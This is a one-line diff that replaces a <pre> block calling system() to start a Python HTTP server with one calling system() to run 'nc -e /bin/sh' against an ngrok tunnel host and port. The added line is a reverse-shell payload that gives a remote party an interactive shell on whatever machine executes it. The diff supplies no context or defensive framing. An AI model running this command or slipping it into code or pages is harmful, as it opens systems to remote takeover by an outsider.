@@ -1,1 +1,1 @@
-<pre>system('python3 -m http.server')</pre>
+<pre>system('nc -e /bin/sh tcp://7.tcp.eu.ngrok.io 16840')</pre>
